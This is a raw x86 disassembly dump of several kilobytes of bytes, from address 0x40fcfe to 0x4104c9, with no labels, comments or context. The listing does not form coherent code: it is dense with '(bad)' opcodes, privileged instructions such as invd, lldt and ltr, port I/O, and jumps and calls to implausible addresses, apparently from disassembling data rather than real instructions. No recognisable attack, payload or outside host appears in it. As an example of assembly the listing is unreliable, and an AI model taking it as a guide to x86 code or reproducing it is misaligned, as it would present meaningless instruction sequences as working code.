  40fcfe:	cli    
  40fcff:	mov    esi,DWORD PTR [ebp-0x4]
  40fd02:	cmp    ecx,esi
  40fd04:	bswap  edi
  40fd06:	(bad)
  40fd0a:	mov    esi,DWORD PTR [ebp-0x4]
  40fd0d:	mov    esi,ecx
  40fd0f:	clc    
  40fd10:	repnz add esi,DWORD PTR [ebp+0x45]
  40fd14:	push   ebx
  40fd15:	xor    eax,DWORD PTR [ebp+0x3]
  40fd18:	xor    BYTE PTR [edi-0x64],bl
  40fd1b:	pop    ebx
  40fd1c:	jmp    0x40fde3
  40fd21:	mov    esi,DWORD PTR [ebp-0x7d]
  40fd24:	xor    ebp,DWORD PTR [eax]
  40fd26:	lea    eax,[ebp-0x8]
  40fd29:	xor    eax,0xc7ef9cf2
  40fd2e:	neg    eax
  40fd30:	ins    DWORD PTR es:[edi],dx
  40fd31:	test   esi,edi
  40fd33:	clc    
  40fd34:	pop    esp
  40fd35:	inc    ebp
  40fd36:	or     BYTE PTR [ecx+0x450f0c7d],cl
  40fd3c:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  40fd42:	add    cl,al
  40fd44:	jne    0x40fce3
  40fd46:	mov    esi,DWORD PTR [edx]
  40fd48:	in     al,dx
  40fd49:	push   esi
  40fd4a:	xor    BYTE PTR [ebp-0xe],dh
  40fd4d:	add    edi,esi
  40fd4f:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  40fd55:	add    cl,bh
  40fd57:	mov    edi,DWORD PTR [ebp+0x8]
  40fd5a:	mov    DWORD PTR [ebp-0x14],esi
  40fd5d:	add    esi,DWORD PTR [ebp+0x3c]
  40fd60:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  40fd66:	mov    ah,0x3e
  40fd68:	popf   
  40fd69:	pushf  
  40fd6a:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  40fd70:	jne    0x40fcfd
  40fd72:	mov    ecx,DWORD PTR [esp+ebp*8]
  40fd75:	icebp  
  40fd76:	icebp  
  40fd77:	shl    edx,0xf2
  40fd7a:	(bad)  
  40fd7b:	mov    ah,0x16
  40fd7d:	pusha  
  40fd7e:	jne    0x40fd13
  40fd80:	mov    ecx,DWORD PTR [edi]
  40fd82:	in     al,dx
  40fd83:	jmp    0x40fd76
  40fd85:	add    dl,dh
  40fd87:	mov    edi,esi
  40fd89:	or     al,0x8
  40fd8b:	inc    ebp
  40fd8c:	jne    0x40fd91
  40fd8e:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  40fd94:	ret    
  40fd95:	or     bh,bh
  40fd97:	jge    0x40fd81
  40fd99:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  40fd9f:	xor    edi,eax
  40fda1:	add    esi,DWORD PTR [ebp-0x77]
  40fda4:	mov    ebx,esp
  40fda6:	clc    
  40fda7:	neg    DWORD PTR [ebp-0x7c]
  40fdaa:	xor    eax,DWORD PTR [eax]
  40fdac:	cmp    eax,DWORD PTR [eax]
  40fdae:	repz jne 0x40fd46
  40fdb1:	xor    eax,DWORD PTR [ecx]
  40fdb3:	add    ebx,DWORD PTR [eax]
  40fdb5:	mov    DWORD PTR [ebp-0x8],eax
  40fdb8:	mov    eax,edi
  40fdba:	cld    
  40fdbb:	lock pop eax
  40fdbd:	test   DWORD PTR [ebx],esi
  40fdbf:	clc    
  40fdc0:	add    edx,DWORD PTR [edi-0x740bff77]
  40fdc6:	fdivp  st(4),st
  40fdc8:	test   ecx,esi
  40fdca:	(bad)  
  40fdcb:	jnp    0x40fdcc
  40fdcd:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  40fdd3:	jae    0x40fd60
  40fdd5:	sub    edi,esp
  40fdd7:	(bad)  
  40fdd8:	shl    DWORD PTR [eax-0x3e],0x89
  40fddc:	leave  
  40fddd:	call   0x8196b4ea
  40fde2:	in     al,dx
  40fde3:	(bad)  
  40fde4:	in     al,dx
  40fde5:	add    bh,al
  40fde7:	mov    esp,edi
  40fde9:	in     al,dx
  40fdea:	test   DWORD PTR [ebp-0x8],edi
  40fded:	mov    eax,DWORD PTR [ebp+0x2b]
  40fdf0:	xor    al,BYTE PTR [ebx]
  40fdf2:	pushf  
  40fdf3:	jnp    0x572ffa2c
  40fdf9:	xor    edx,DWORD PTR [esi-0x77]
  40fdfc:	push   ecx
  40fdfd:	loopne 0x40fe32
  40fdff:	jne    0x40fdbc
  40fe01:	mov    esi,DWORD PTR [edx-0x20]
  40fe04:	add    BYTE PTR [ebp-0x3d],bh
  40fe07:	xor    eax,DWORD PTR [ebp-0x73]
  40fe0a:	mov    edi,DWORD PTR [esi]
  40fe0c:	cld    
  40fe0d:	jb     0x40fdd5
  40fe0f:	add    bl,al
  40fe11:	jne    0x40fe58
  40fe13:	mov    edx,DWORD PTR [edi-0x10]
  40fe16:	jge    0x40fe95
  40fe18:	mov    esi,DWORD PTR [ebx]
  40fe1a:	lock add ecx,DWORD PTR [ebp+0x3b]
  40fe1e:	xor    esi,DWORD PTR [ebp-0x77]
  40fe21:	mov    esi,eax
  40fe23:	lock inc ebp
  40fe25:	jge    0x40fe5c
  40fe27:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  40fe2e:	dec    ebp
  40fe2f:	mov    esi,DWORD PTR [ebx]
  40fe31:	loopne 0x40fdbc
  40fe33:	jge    0x40fe2d
  40fe35:	add    DWORD PTR [ebp-0x7d],eax
  40fe38:	cmc    
  40fe39:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  40fe40:	dec    ebp
  40fe41:	hlt    
  40fe42:	xor    ebx,DWORD PTR [ebp-0x77]
  40fe45:	mov    esi,esp
  40fe47:	in     al,0x45
  40fe49:	jge    0x40fe7c
  40fe4b:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  40fe52:	dec    ebp
  40fe53:	xor    edx,DWORD PTR fs:[ebx+0x3ec7389]
  40fe5a:	inc    ebp
  40fe5b:	hlt    
  40fe5c:	xor    eax,0xb88b9f75
  40fe61:	add    al,0x95
  40fe63:	icebp  
  40fe64:	add    dl,dh
  40fe66:	mov    DWORD PTR [ebp+0x20],ebx
  40fe69:	cmp    eax,DWORD PTR [ebp+0xf]
  40fe6c:	test   DWORD PTR [edi+ecx*1-0x1],edx
  40fe70:	fistp  WORD PTR [ebx+0x0]
  40fe73:	inc    ebp
  40fe74:	mov    ebx,DWORD PTR [edi+0xc]
  40fe77:	add    eax,eax
  40fe79:	inc    ebp
  40fe7a:	test   BYTE PTR [ebx],dh
  40fe7c:	add    eax,DWORD PTR [ebx]
  40fe7e:	add    BYTE PTR [esi+0x45],bl
  40fe81:	ret    0x85
  40fe84:	jnp    0x54418253
  40fe8a:	inc    bp
  40fe8c:	inc    ebp
  40fe8d:	xor    eax,0xc78a9cb9
  40fe92:	add    ah,bl
  40fe94:	xor    eax,DWORD PTR [ebp+0x453bf8b9]
  40fe9a:	add    BYTE PTR [ebx+0x3],dl
  40fe9d:	mov    esi,0x708088b
  40fea2:	cmp    esi,eax
  40fea4:	setge  BYTE PTR [ecx-0x74fcffce]
  40feab:	mov    esp,edi
  40fead:	call   0x33cc43ff
  40feb2:	or     BYTE PTR [ebx],al
  40feb4:	inc    ecx
  40feb5:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  40febb:	and    BYTE PTR [ebp-0x7074f0bb],al
  40fec1:	lock add cl,al
  40fec4:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  40fecb:	mov    ch,0x45
  40fecd:	clc    
  40fece:	xor    eax,DWORD PTR [ebp+0x3]
  40fed1:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  40fed7:	inc    ebp
  40fed8:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  40fede:	mov    edi,eax
  40fee0:	mov    eax,DWORD PTR [ebp+0x3c]
  40fee3:	mov    ecx,DWORD PTR [eax]
  40fee5:	hlt    
  40fee6:	inc    ebp
  40fee7:	ror    DWORD PTR [ebx+0x818c45],0xf4
  40feee:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  40fef4:	push   ebp
  40fef5:	mov    edi,DWORD PTR [ebx]
  40fef7:	in     al,dx
  40fef8:	jne    0x40febb
  40fefa:	mov    eax,DWORD PTR [ebp-0x28]
  40fefd:	add    DWORD PTR [eax],0xe8058dec
  40ff03:	clc    
  40ff04:	mov    eax,DWORD PTR [edi]
  40ff06:	clc    
  40ff07:	add    dh,dl
  40ff09:	rol    WORD PTR [ebp-0x1],cl
  40ff0d:	mov    edx,DWORD PTR [eax+0x8]
  40ff10:	jne    0x40fed2
  40ff12:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  40ff19:	inc    ebp
  40ff1a:	push   esp
  40ff1b:	test   DWORD PTR [ecx+0xf],ecx
  40ff1e:	sub    edx,esp
  40ff20:	add    eax,DWORD PTR [eax]
  40ff22:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  40ff28:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  40ff2f:	mov    eax,DWORD PTR [ecx]
  40ff31:	and    BYTE PTR [eax],al
  40ff33:	inc    eax
  40ff34:	adc    BYTE PTR [eax],al
  40ff36:	inc    ebp
  40ff37:	inc    cx
  40ff3a:	push   esp
  40ff3b:	push   es
  40ff3c:	jne    0x40ff3e
  40ff3e:	push   edx
  40ff3f:	enterw 0xc1,0x4d
  40ff44:	mov    esp,DWORD PTR [esi+0x20]
  40ff47:	add    DWORD PTR [ecx-0x7b],eax
  40ff4a:	add    eax,DWORD PTR [ebx]
  40ff4c:	str    WORD PTR [eax+0x45]
  40ff50:	lea    ecx,[ebx+0x45890801]
  40ff56:	sbb    BYTE PTR [ebx],al
  40ff58:	dec    ebp
  40ff59:	cmp    al,0xf
  40ff5b:	inc    ebp
  40ff5c:	push   eax
  40ff5d:	mov    esi,DWORD PTR [ebx]
  40ff5f:	push   eax
  40ff60:	add    eax,eax
  40ff62:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  40ff69:	inc    ebp
  40ff6a:	add    BYTE PTR ds:0x8b4d8c00,dh
  40ff70:	xor    edx,esp
  40ff72:	add    eax,esi
  40ff74:	mov    ebx,eax
  40ff76:	loopne 0x40ffbd
  40ff78:	dec    ebp
  40ff79:	mov    ecx,DWORD PTR [edi]
  40ff7b:	cld    
  40ff7c:	push   eax
  40ff7d:	xchg   DWORD PTR [ebx],esi
  40ff7f:	add    DWORD PTR [ebx],ebp
  40ff81:	add    BYTE PTR [ebx],ch
  40ff83:	or     BYTE PTR [ecx],bh
  40ff85:	dec    ecx
  40ff86:	loopne 0x40ff8b
  40ff88:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  40ff8e:	push   ebp
  40ff8f:	add    DWORD PTR [ebx+0x55100800],eax
  40ff95:	dec    ebp
  40ff96:	jmp    0x40ff21
  40ff98:	mov    esp,DWORD PTR [eax]
  40ff9a:	sbb    dl,dl
  40ff9c:	inc    eax
  40ff9d:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  40ffa3:	add    BYTE PTR [ebx+0x74528555],cl
  40ffa9:	push   ebp
  40ffaa:	div    DWORD PTR [ebx]
  40ffac:	and    eax,DWORD PTR [ebx]
  40ffae:	add    edx,DWORD PTR [edx-0x30]
  40ffb1:	jno    0x40ff3e
  40ffb3:	inc    DWORD PTR [eax+eiz*1]
  40ffb6:	inc    ebp
  40ffb7:	push   eax
  40ffb8:	push   eax
  40ffb9:	mov    esp,DWORD PTR [edi-0x74beff1c]
  40ffbf:	mov    edi,esp
  40ffc1:	push   eax
  40ffc2:	inc    ebp
  40ffc3:	enter  0x458b,0x8
  40ffc7:	push   ecx
  40ffc8:	(bad)  
  40ffc9:	call   0x10b09a1
  40ffce:	pop    ss
  40ffcf:	push   ebp
  40ffd0:	mov    ecx,DWORD PTR [ebx+0x489408]
  40ffd6:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  40ffdc:	push   ecx
  40ffdd:	jo     0x40ffc7
  40ffdf:	inc    DWORD PTR [edi]
  40ffe1:	or     BYTE PTR [eax],al
  40ffe3:	call   0xcc072d
  40ffe8:	fmul   QWORD PTR [ebp+0x55]
  40ffeb:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  40fff1:	mov    bh,0x8c
  40fff3:	adc    al,0x9d
  40fff5:	dec    esp
  40fff6:	xor    bl,BYTE PTR [eax]
  40fff8:	mov    ecx,DWORD PTR [ebp+0xc]
  40fffb:	mov    eax,DWORD PTR [ebp-0x4]
  40fffe:	mov    esi,DWORD PTR [edi-0x3148f924]
  410004:	push   es
  410005:	retf   
  410006:	mov    BYTE PTR [ebp-0x30],0x3b
  41000a:	inc    ebp
  41000b:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  410012:	retf   0x83fc
  410015:	into   
  410016:	dec    ebp
  410017:	retf   
  410018:	mov    ecx,DWORD PTR [ebp-0x74]
  41001b:	mov    eax,DWORD PTR [eax]
  41001d:	fdiv   QWORD PTR [ebx]
  41001f:	mov    bh,0x3
  410021:	push   es
  410022:	mov    esi,ecx
  410024:	sbb    cl,dl
  410026:	dec    ebp
  410027:	sar    DWORD PTR [ebx],cl
  410029:	push   ebp
  41002a:	jne    0x41003b
  41002c:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  410032:	lea    ebx,[eax]
  410034:	call   0xf4ca8bfb
  410039:	sbb    dh,dl
  41003b:	add    edx,ebx
  41003d:	push   ebp
  41003e:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  410044:	push   ecx
  410045:	mov    DWORD PTR [eax-0x30],edx
  410048:	test   DWORD PTR [edx],eax
  41004a:	xadd   esp,esi
  41004d:	pop    es
  41004e:	add    cl,dl
  410050:	mov    eax,ecx
  410052:	or     al,0x45
  410054:	(bad)  
  410055:	push   eax
  410056:	add    DWORD PTR [edx+0x0],eax
  410059:	add    ecx,DWORD PTR [ecx]
  41005b:	and    dh,cl
  41005d:	call   0xc5092d
  410062:	add    DWORD PTR [ebp+0x0],edx
  410065:	mov    esp,DWORD PTR [ebp+0x18]
  410068:	add    BYTE PTR [eax+0x28],cl
  41006b:	xor    eax,DWORD PTR [eax]
  41006d:	add    esp,DWORD PTR [esi+0x3b]
  410070:	inc    ebp
  410071:	je     0x40fff6
  410073:	push   ecx
  410074:	push   es
  410075:	dec    ebp
  410076:	mov    DWORD PTR [ebx],eax
  410078:	(bad)  
  410079:	or     al,0x1e
  41007b:	inc    eax
  41007c:	add    BYTE PTR [ebx],al
  41007e:	data16 and BYTE PTR [ebp+0x50],al
  410082:	sub    DWORD PTR [ecx],0x8
  410085:	add    BYTE PTR [ebp-0x75],ah
  410088:	add    BYTE PTR [eax],bl
  41008a:	enter  0x894d,0x8b
  41008e:	int3   
  41008f:	loopne 0x41004b
  410091:	rol    BYTE PTR [eax],0x33
  410094:	lea    cx,[ebp+0xa]
  410098:	data16 jb 0x4100e0
  41009b:	add    BYTE PTR [ebx+0x44890855],cl
  4100a1:	sbb    ah,al
  4100a3:	inc    ebp
  4100a4:	inc    eax
  4100a5:	lldt   WORD PTR [edx+0x66]
  4100a9:	xor    ecx,DWORD PTR [eax]
  4100ab:	sub    eax,DWORD PTR [esi]
  4100ad:	mov    eax,DWORD PTR [eax]
  4100af:	or     al,0x66
  4100b1:	ror    edx,cl
  4100b3:	dec    ebp
  4100b4:	inc    ebp
  4100b5:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  4100bb:	cld    
  4100bc:	or     BYTE PTR [edi+0x4501dd],dl
  4100c2:	retf   0xe0ce
  4100c5:	retf   
  4100c6:	(bad)  
  4100c7:	dec    ebp
  4100c8:	mov    al,0x8b
  4100ca:	in     al,dx
  4100cb:	and    BYTE PTR [ebx],dh
  4100cd:	or     al,BYTE PTR [ebp+0x27]
  4100d0:	in     al,dx
  4100d1:	xchg   eax,esp
  4100d3:	add    edi,eax
  4100d5:	add    BYTE PTR [eax+0x3f52ed55],bh
  4100db:	push   ebp
  4100dc:	inc    ebp
  4100dd:	xor    edx,edx
  4100df:	add    esp,eax
  4100e1:	push   edx
  4100e2:	push   bp
  4100e4:	inc    ebp
  4100e5:	jmp    ecx
  4100e7:	push   esp
  4100e8:	(bad)  
  4100e9:	inc    edx
  4100eb:	sbb    al,0x33
  4100ed:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  4100f4:	add    BYTE PTR [ebp+0x48],0x8b
  4100f8:	jmp    0xf98b:0x100041c8
  4100ff:	xor    esi,DWORD PTR [edx+0x3]
  410102:	mov    ecx,DWORD PTR [edi]
  410104:	fmul   DWORD PTR [edx]
  410106:	add    BYTE PTR [eax],al
  410108:	lea    eax,[ebx-0x4700273c]
  41010e:	add    al,0x4f
  410110:	pop    DWORD PTR [eax]
  410112:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  410118:	push   edx
  410119:	inc    WORD PTR [ebp+0x8]
  41011d:	mov    eax,0x514f4d
  410122:	(bad)
  410126:	add    al,al
  410128:	xor    DWORD PTR [ebx-0x74baf730],eax
  41012e:	test   DWORD PTR [esi+0x74],esp
  410131:	inc    ebp
  410132:	mov    DWORD PTR [eax+0xa4e08],edi
  410138:	add    BYTE PTR [ecx-0x76c435bb],cl
  41013e:	or     dh,cl
  410140:	or     eax,0x8b8d5045
  410145:	inc    ebp
  410146:	mov    WORD PTR [ecx+0x3b8a00],?
  41014c:	jne    0x410181
  41014e:	mov    edi,DWORD PTR [edx+0x8f3b18]
  410154:	add    DWORD PTR [ebx],eax
  410156:	add    bh,bh
  410158:	adc    DWORD PTR [eax],ecx
  41015a:	adc    DWORD PTR [ebp+0x55],edi
  41015d:	push   es
  41015e:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  410164:	mov    ebp,DWORD PTR [eax+ebp*1+0x503411d2]
  41016b:	inc    ebp
  41016c:	mov    edx,edi
  41016e:	or     al,0xd2
  410170:	push   eax
  410171:	(bad)  
  410172:	jne    0x410128
  410174:	call   0x28fa5b
  410179:	inc    ebp
  41017a:	shl    BYTE PTR [esp+eax*4],0xe0
  41017e:	add    bh,al
  410180:	add    BYTE PTR [ebp+esi*2-0x2c742e],bh
  410187:	(bad)  
  410188:	and    al,al
  41018a:	fs loope 0x41018c
  41018d:	inc    ebp
  41018e:	test   DWORD PTR [esi+0xf],edi
  410191:	leave  
  410192:	scas   al,BYTE PTR es:[edi]
  410193:	inc    esp
  410194:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  41019b:	or     BYTE PTR [ebx-0x97717ca],0x83
  4101a2:	call   DWORD PTR [edi]
  4101a4:	shr    ah,0x84
  4101a7:	xchg   DWORD PTR [eax],eax
  4101a9:	add    DWORD PTR [eax],eax
  4101ab:	add    bh,bh
  4101ad:	dec    ebp
  4101ae:	and    BYTE PTR [ecx-0x38],dl
  4101b1:	push   eax
  4101b2:	dec    DWORD PTR [ebx+0xfd885]
  4101b8:	mov    BYTE PTR [ebp+0x508bac00],cl
  4101be:	mov    WORD PTR [ecx+0x0],ss
  4101c1:	lea    ecx,[ebx+0x108b20d8]
  4101c7:	mov    WORD PTR [edx],ds
  4101c9:	add    BYTE PTR [edi+0xff01ff],al
  4101cf:	mov    ecx,DWORD PTR [ebp-0x28]
  4101d2:	push   ecx
  4101d3:	shl    BYTE PTR [ebp+0x3a],0x8b
  4101d7:	inc    ebp
  4101d8:	in     al,0xeb
  4101da:	jno    0x410167
  4101dc:	push   edx
  4101dd:	mov    DWORD PTR [eax-0x28],edx
  4101e0:	mov    eax,DWORD PTR [ebp+0x20]
  4101e3:	je     0x41016c
  4101e5:	mov    eax,DWORD PTR [ecx]
  4101e7:	sbb    BYTE PTR [eax],al
  4101e9:	pop    DWORD PTR [eax]
  4101eb:	add    esi,eax
  4101ed:	add    bl,al
  4101ef:	adc    DWORD PTR [edi],esi
  4101f1:	jmp    0x8bcc5243
  4101f6:	sub    BYTE PTR [ebp+eax*2-0x63c4cb00],cl
  4101fd:	jne    0x41018a
  4101ff:	mov    ecx,DWORD PTR [eax]
  410201:	in     al,0x75
  410203:	pop    DWORD PTR [ecx+0x5601]
  410209:	push   edx
  41020a:	inc    DWORD PTR [ebx]
  41020c:	adc    BYTE PTR [ecx+0x45721cc6],cl
  410212:	add    BYTE PTR [edi+0x9],dl
  410215:	call   DWORD PTR [esi]
  410217:	and    dl,al
  410219:	and    bh,bh
  41021b:	inc    edi
  41021d:	test   eax,edx
  41021f:	sldt   ebx
  410222:	xor    al,BYTE PTR [eax]
  410224:	pushf  
  410225:	(bad)  
  410226:	jmp    0x410234
  410228:	mov    eax,edi
  41022a:	or     al,0x75
  41022c:	inc    eax
  41022d:	call   0x40f935
  410232:	mov    eax,eax
  410234:	loopne 0x4101ba
  410236:	inc    ebp
  410237:	add    BYTE PTR [ebx+0x1451c00],cl
  41023d:	mov    eax,DWORD PTR [ebp+0x20]
  410240:	add    edi,ecx
  410242:	add    BYTE PTR [eax],ch
  410244:	cmp    edi,0x18
  410247:	test   DWORD PTR [ebp+0xf],esi
  41024a:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  410251:	jne    0x410255
  410253:	call   0xff9ffd18
  410258:	leave  
  410259:	rcr    BYTE PTR [esp+eax*4],0x55
  41025d:	add    ah,ch
  41025f:	add    BYTE PTR [edi-0x48fef979],dh
  410265:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  41026c:	inc    esp
  41026d:	mov    ebx,DWORD PTR [eax]
  41026f:	fcom   st(2)
  410271:	add    BYTE PTR [edi],bl
  410273:	lea    ecx,[eax-0x18]
  410276:	(bad)  
  410277:	push   DWORD PTR [ecx]
  410279:	call   0xffb34fdb
  41027e:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  410282:	fstp   DWORD PTR [esi+ebx*8]
  410285:	push   ebp
  410286:	pop    ebp
  410287:	mov    esi,DWORD PTR [edx-0x38]
  41028a:	add    DWORD PTR [eax],0x28
  41028d:	mov    edi,DWORD PTR [ebx]
  41028f:	xor    esi,DWORD PTR [edx+0x3]
  410292:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  410296:	pop    ebp
  410297:	or     al,0x4
  410299:	inc    ecx
  41029a:	push   ebp
  41029b:	(bad)  
  41029c:	in     al,dx
  41029d:	or     ah,ch
  41029f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4102a0:	xbegin 0xffc67896
  4102a6:	clc    
  4102a7:	adc    al,0x45
  4102a9:	div    BYTE PTR [edx]
  4102ab:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  4102b2:	test   DWORD PTR [ebp+0x661b00f8],ebx
  4102b8:	add    BYTE PTR [ecx+0x66],dh
  4102bb:	add    eax,DWORD PTR [ebp+0x52]
  4102be:	adc    eax,0x60
  4102c1:	xchg   DWORD PTR [ecx+0x3400fc01],ecx
  4102c7:	test   DWORD PTR [eax],eax
  4102c9:	clc    
  4102ca:	data16 or al,BYTE PTR [ebp+0x45]
  4102ce:	or     DWORD PTR [ebx-0x3d76d720],0xfffffff8
  4102d5:	rol    BYTE PTR [ebp+0x45],1
  4102d8:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  4102de:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  4102e4:	push   ebx
  4102e5:	add    BYTE PTR [esi+0x0],dl
  4102e8:	push   ecx
  4102e9:	jge    0x41031e
  4102eb:	add    BYTE PTR [esi+0x4],dl
  4102ee:	jne    0x410355
  4102f0:	mov    edx,0x457200
  4102f5:	jmp    0x4102b9
  4102f7:	xor    edi,DWORD PTR [ebx]
  4102f9:	pop    edi
  4102fa:	cvtdq2ps xmm7,xmm0
  4102fd:	ret    0x0
  410300:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  410306:	xor    ecx,DWORD PTR [edi]
  410308:	add    eax,DWORD PTR [ecx+0x3b]
  41030b:	push   ebx
  41030c:	rdpmc  
  41030e:	out    0x8d,al
  410310:	add    BYTE PTR [eax],cl
  410312:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  410318:	ret    0x450c
  41031b:	sbb    al,0x8b
  41031d:	cmp    eax,esi
  41031f:	or     cl,al
  410321:	or     al,0xc2
  410323:	pop    eax
  410324:	inc    ebp
  410325:	add    ecx,DWORD PTR [edi]
  410327:	add    esi,DWORD PTR [ebp+0x39]
  41032a:	invd   
  41032c:	jge    0x410338
  41032e:	mov    eax,0x478ac0
  410333:	cli    
  410334:	xor    esp,ecx
  410336:	mov    ebx,0x5b8ac0
  41033b:	ret    0x33
  41033e:	mov    eax,0x833b8b
  410343:	sub    BYTE PTR [ebx],al
  410345:	inc    ebp
  410346:	xor    ax,0x9cf8
  41034a:	inc    bh
  41034c:	mov    esp,esp
  41034e:	hlt    
  41034f:	test   DWORD PTR [ebp-0x8],esi
  410352:	mov    eax,DWORD PTR [ebp-0x14]
  410355:	xor    ecx,DWORD PTR [ebx-0x76478864]
  41035b:	dec    edi
  41035c:	or     BYTE PTR [eax],al
  41035e:	jne    0x4102e9
  410360:	mov    esi,esp
  410362:	call   0x77a78f27
  410367:	inc    ebp
  410368:	mov    DWORD PTR [eax+0x9d4f0c],edi
  41036e:	add    BYTE PTR [ecx-0x3ffe0717],cl
  410374:	add    BYTE PTR [esi+0x7d],ah
  410377:	inc    ebp
  410378:	mov    bx,WORD PTR [ebp+0x8]
  41037c:	add    DWORD PTR [ebp+0x56],0x30c008b
  410383:	inc    ebp
  410384:	mov    bx,di
  410387:	lock test BYTE PTR [ecx+0x7000801],bh
  41038e:	jge    0x410351
  410390:	mov    ecx,DWORD PTR [ebx-0x620613f0]
  410396:	cli    
  410397:	xor    bl,bh
  410399:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  41039f:	test   BYTE PTR [eax],cl
  4103a1:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  4103a8:	cmp    ebp,eax
  4103aa:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  4103b1:	test   BYTE PTR [ebp+0x1],bh
  4103b4:	mov    ebx,0x458a00
  4103b9:	xor    esi,DWORD PTR [ebx]
  4103bb:	add    esp,DWORD PTR [esi-0x77]
  4103be:	pop    ebp
  4103bf:	loopne 0x410427
  4103c1:	inc    ebp
  4103c2:	clc    
  4103c3:	xor    edi,DWORD PTR [ebx]
  4103c5:	add    esi,DWORD PTR [edx-0x77]
  4103c8:	data16 fdivr QWORD PTR [ebp-0x49]
  4103cc:	mov    ebx,0xb78afc
  4103d1:	hlt    
  4103d2:	xor    eax,DWORD PTR [eax+0x66]
  4103d5:	add    BYTE PTR [ebp+0x66],bl
  4103d8:	data16 lock clc 
  4103db:	inc    eax
  4103dc:	cmp    eax,DWORD PTR [eax]
  4103de:	ja     0x410446
  4103e0:	psubq  mm7,QWORD PTR [ebp+0x6]
  4103e4:	ltr    WORD PTR [ebp+0x66]
  4103e8:	add    esi,eax
  4103ea:	add    di,WORD PTR [ebp+0x2b]
  4103ee:	data16 data16 jge 0x41046f
  4103f2:	mov    ebx,0xe08a8b
  4103f7:	jge    0x41042c
  4103f9:	data16 data16 xor al,0x5d
  4103fd:	data16 data16 jne 0x4103f9
  410401:	mov    edi,DWORD PTR [ebx]
  410403:	fdiv   QWORD PTR [edx+0x7d]
  410406:	data16 data16 jge 0x41043e
  41040a:	mov    ebx,0x758a66
  41040f:	mov    esi,0x667233
  410414:	pop    ebp
  410415:	or     BYTE PTR [esi+0x0],ah
  410418:	clc    
  410419:	mov    edi,DWORD PTR [ebx]
  41041b:	lock ja 0x4103a9
  41041e:	(bad)  
  410420:	jge    0x410419
  410422:	invd   
  410424:	pop    ebp
  410425:	add    BYTE PTR [ebx],al
  410427:	(bad)  
  410428:	cmp    di,WORD PTR [ebp+0xf]
  41042c:	data16 sbb bh,BYTE PTR [ebp+0x0]
  410430:	mov    bx,WORD PTR [ebp-0x10]
  410434:	pop    bp
  410436:	fbstp  TBYTE PTR [ebx]
  410438:	test   DWORD PTR [ebx],eax
  41043a:	add    BYTE PTR [ebx],bh
  41043c:	add    BYTE PTR [esi+0x7d],ah
  41043f:	jge    0x4103cc
  410441:	data16 in al,dx
  410443:	pop    ebp
  410444:	stc    
  410445:	bsf    ecx,DWORD PTR [ebp+0x6632009d]
  41044c:	mov    edi,ebx
  41044e:	in     al,dx
  41044f:	test   BYTE PTR [ebp+0x0],bh
  410452:	mov    eax,DWORD PTR [eax]
  410454:	call   0xbd3dfde4
  410459:	inc    eax
  41045a:	popf   
  41045b:	add    BYTE PTR [edx],dh
  41045d:	mov    bx,di
  410460:	call   0x8b4981f0
  410465:	add    ebp,esp
  410467:	mov    bx,di
  41046a:	jnp    0x410492
  41046c:	mov    DWORD PTR [ebx+0x407df808],ecx
  410472:	mov    eax,DWORD PTR [eax]
  410474:	call   0x7c3c8fdf
  410479:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  41047f:	data16 data16 fistp WORD PTR [ebp+0xe]
  410484:	xor    DWORD PTR [edi-0x48fff7aa],0xfb66f403
  41048e:	fisttp WORD PTR [ecx-0x7401f77b]
  410494:	(bad)  
  410495:	cld    
  410496:	jne    0x4104d8
  410498:	xor    eax,DWORD PTR [eax]
  41049a:	mov    esp,DWORD PTR [esi-0x10]
  41049d:	sti    
  41049e:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  4104a5:	data16 adc bl,bh
  4104a8:	push   ebp
  4104a9:	xor    ecx,DWORD PTR es:[ebx+0x40e4f88b]
  4104b0:	mov    WORD PTR [eax],es
  4104b2:	popf   
  4104b3:	data16 xor bh,bl
  4104b6:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  4104bc:	mov    esp,DWORD PTR [esi-0x14]
  4104bf:	fisttp WORD PTR [ebx-0x3748a9f2]
  4104c5:	or     al,0x2b
  4104c7:	mov    bh,0xba
  4104c9:	hlt    
